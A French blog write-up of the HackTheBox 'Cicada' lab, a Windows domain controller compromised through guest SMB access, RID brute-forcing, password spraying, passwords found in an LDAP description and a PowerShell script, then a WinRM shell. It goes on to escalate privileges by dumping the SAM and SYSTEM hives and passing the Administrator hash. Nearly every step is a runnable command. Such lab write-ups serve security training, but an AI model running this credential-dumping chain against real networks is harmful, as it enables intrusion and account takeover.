---
date: 2025-02-13T17:24:03-06:00
# description: ""
image: "/images/HTB-Cicada/Cicada.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Cicada"
type: "post"
---

* Platforme: HackTheBox
* Lien: [Cicada](https://app.hackthebox.com/machines/Cicada)
* Niveau: Facile
* OS: Windows
---

Cicada est un contrôleur de domaine Active Directory. Nous sommes en mesure de nous connecter via SMB avec le compte invité, ce qui nous permet de récupérer une note contenant un mot de passe. Grâce à une attaque par force brute RID, nous énumérons les noms d'utilisateurs du domaine et découvrons des identifiants valides, que nous utilisons pour nous connecter via LDAP. Une énumération plus poussée révèle un mot de passe stocké dans le champ de description d'un utilisateur. Avec ce mot de passe nous accédons à un autre partage SMB contenant un script PowerShell avec des informations d'identification supplémentaires. Nous les utilisons pour obtenir un accès initial au système via WinRM. L'utilisateur compromis possède le privilège `SeBackupPrivilege` et est membre du groupe `Backup Operators`, ce qui offre deux possibilités d'exploitation.

Addresse IP cible - `10.10.11.35`

## Balayage

```
nmap -p- -sC -sV -Pn 10.10.11.35
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 23:27 CST
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.059s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 12:32:02Z)

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time

445/tcp   open  microsoft-ds?

464/tcp   open  kpasswd5?

593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16

3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time

5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

57002/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2025-01-13T12:32:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 356.76 seconds
```

Notre cible est un contrôleur de domaine Active Directory. Mettons à jour le fichier `/etc/hosts` selon les résultats de nmap.

```
sudo echo "10.10.11.35 cicada.htb cicada.htb0 CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

## Enumération

Commençons par SMB.

```
smbclient -N -L cicada.htb
```

![SMB shares list](/images/HTB-Cicada/smbclient_cmd.png)

Nous remarquons différents partages tels que `HR` et `DEV`. Nous pouvons essayer de nous connecter avec un compte `Guest` afin de trouver plus d'informations.

```
netexec smb cicada.htb -u Guest -p "" --shares
```

![SMB guest login](/images/HTB-Cicada/shares_list.png)

Nous pouvons lire les partages: `HR` et `IPC$` ( partage par défaut).

```
smbclient //cicada.htb/HR
```

![HR share content](/images/HTB-Cicada/HR_share.png)

Nous trouvons un fichier appelé `Notice from HR.txt` et le téléchargeons. Il contient un mot de passe : `Cicada$M6Corpb*@Lp#nZp!8`.

![Password found in HR share](/images/HTB-Cicada/notice_from_HR.png)

Nous avons maintenant besoin d'un nom d'utilisateur, nous pouvons trouver les noms d'utilisateurs du domaine via le RID brute forcing.

```
netexec smb cicada.htb -u guest -p '' --rid-brute
```

Après leur extraction, nous obtenons la liste suivante.

![SMB accounts](/images/HTB-Cicada/accounts.png)

```
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

![SMB usernames list](/images/HTB-Cicada/usernames.png)

Nous comparons le mot de passe à notre liste de noms d'utilisateurs, et nous trouvons une correspondance pour `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8`.

```
netexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![SMB credentials match](/images/HTB-Cicada/creds_match.png)


Utilisons les nouveaux identifiants pour nous connecter via SMB.

```
netexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

![michael.wrightson available shares](/images/HTB-Cicada/micheal_smb.png)

Cet utilisateur a accès aux partages `NETLOGON` et `SYSVOL` en plus des deux partages précédents observés plus tôt. Malheureusement, aucun d'entre eux ne contient d'informations utiles.

Essayons de nous authentifier via LDAP.

```
netexec ldap cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![LDAP authentication michael.wrightson](/images/HTB-Cicada/LDAP_auth_michael.png)

L'authentification est un succès! Nous pouvons obtenir plus d'informations avec `ldapdomaindump`.

```
ldapdomaindump 10.10.11.35 -u 'cicada\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![ldapdomaindump](/images/HTB-Cicada/ldapdomaindump.png)

Dans `domain_users.html` nous remarquons que `david.orelious` a laissé son mot de passe (`aRt$Lp#7t*VQ!3`) dans la description.

![david.orelious password found](/images/HTB-Cicada/david_pwd.png)

---

Il est également possible d'utiliser `ldapsearch` pour obtenir le mot de passe.


Nous commençons par lister toutes les informations concernant le domaine.

```
ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb'
```

La commande suivante permet d'afficher tous les noms d'utilisateurs du domaine.

```
ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb' "(objectClass=person)" | grep "sAMAccountName:"
```

![ldapsearch finds domain names](/images/HTB-Cicada/ldapsearch_domain_names.png)

Nous tentons de trouver quelques mots de passe à l'aide de la commande ci-dessous.

```
ldapsearch -H ldap://cicada.htb -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'dc=cicada,dc=htb' | grep pass
```

![ldapsearch finds passwords](/images/HTB-Cicada/ldapsearch_pwdfind.png)

Ensuite, nous comparons la liste des utilisateurs au nouveau mot de passe trouvé.

```
netexec smb cicada.htb -u users.txt -p 'aRt$Lp#7t*VQ!3' --continue-on-success
```

![ldap password match](/images/HTB-Cicada/pwd_match.png)

Nous savons maintenant que le mot de passe `aRt$Lp#7t*VQ!3` appartient à `david.orelious`.

---

Avec ces nouveaux identifiants, nous énumérons à nouveau SMB.

```
netexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![david.orelious available shares](/images/HTB-Cicada/david_smb.png)

Cet utilisateur a accès au partage `DEV`.

```
smbclient //cicada.htb/DEV -U david.orelious
```

![DEV share accessed](/images/HTB-Cicada/DEV_share.png)

Le partage `DEV` contient un fichier appelé `Backup_script.ps1` que nous téléchargeons. Son contenu est le suivant:

```PowerShell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

## Shell en tant que emily.oscars

Le script contient le mot de passe (`Q!3@Lp#M6b*7t*Vt`) de `emily.oscars`. Nous savons d'après le scan nmap que winrm tourne sur le port 5985. Vérifions donc si nous pouvons nous connecter avec.

Faites une liste avec les trois mots de passe que nous avons jusqu'à présent et comparez-la à la liste des noms d'utilisateurs.

```
netexec winrm cicada.htb -u users.txt -p passwords.txt
```

![WinRM valid credentials](/images/HTB-Cicada/winrm_valid.png)

`emily.oscars:Q!3@Lp#M6b*7t*Vt` sont les seules informations d'identification valides. 

```
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![emily.oscars WinRM login](/images/HTB-Cicada/foothold.png)

Le drapeau utilisateur peut être lu à l'adresse suivante : `C:\Users\emily.oscars.CICADA\Desktop\user.txt`.

Nous observons que `emily.oscars` possède le privilège `SeBackupPrivilege` et avec `net user emily.oscars` nous apprenons qu'elle est membre du groupe `Backup Operators`.

> Bien que les membres du groupe **Backup Operators** bénéficient par défaut du privilège **SeBackupPrivilege**, l'inverse n'est pas toujours vrai. Un utilisateur peut avoir le privilège **SeBackupPrivilege** sans être membre du groupe **Backup Operators** parce que les privilèges sous Windows peuvent être attribués explicitement à des utilisateurs ou à des groupes indépendamment de l'appartenance à un groupe.

![emily.oscars group membership](/images/HTB-Cicada/backup_operators_group.png)


## Elévation de Privilèges

Puisque l'utilisateur que nous contrôlons a le privilège `SeBackupPrivilege` et est membre du groupe `Backup Operators`, nous pouvons accéder au drapeau root par deux méthodes différentes.

### Méthode Hash Dump

Cet [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) explique comment abuser de `SeBackupPrivilege`.

Avec le shell `emily.oscars`, exécutez les commandes suivantes

```
mkdir Temp
```

![Temp directory creation](/images/HTB-Cicada/Temp_dir.png)

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

![SAM & SYSTEM registries](/images/HTB-Cicada/sam_&_system.png)

```
cd Temp
download sam
download system
```

![Registry files download](/images/HTB-Cicada/dl_files.png)

Sur notre machine locale, nous récupérons le hash de l'administrateur avec impacket.

```
impacket-secretsdump -sam sam -system system local
```

![impacket hash dump](/images/HTB-Cicada/hash_dump.png)

> `pypykatz` peut aussi être utilisé pour extraire les hashs avec la commande `pypykatz registry --sam sam system`.

Nous pouvons maintenant nous connecter en tant qu'administrateur et lire le drapeau root.

```
evil-winrm -i cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

![Administrator login via EvilWinRM](/images/HTB-Cicada/root_flag.png)

### Attaque Locale

Nous pouvons également utiliser la méthode présentée [ici](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html#backup-operators). Vous devrez aller sur [ce repo Github](https://github.com/giuliano108/SeBackupPrivilege) pour obtenir `SeBackupPrivilegeUtils.dll` et `SeBackupPrivilegeCmdLets.dll`.

1. Après avoir cloné le repo, nous transférons les fichiers vers la cible via notre shell evil-winrm.

```
upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/HTB/Cicada//SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
```

![SeBackup files](/images/HTB-Cicada/SeBackup_files.png)

2. Nous importons les bibliothèques

```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

![Modules Import](/images/HTB-Cicada/Modules_Import.png)

3. Enfin, nous copions le drapeau root

```
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\emily.oscars.CICADA\Documents\root.txt
```

![root flag copied](/images/HTB-Cicada/copy_root_flag.png)
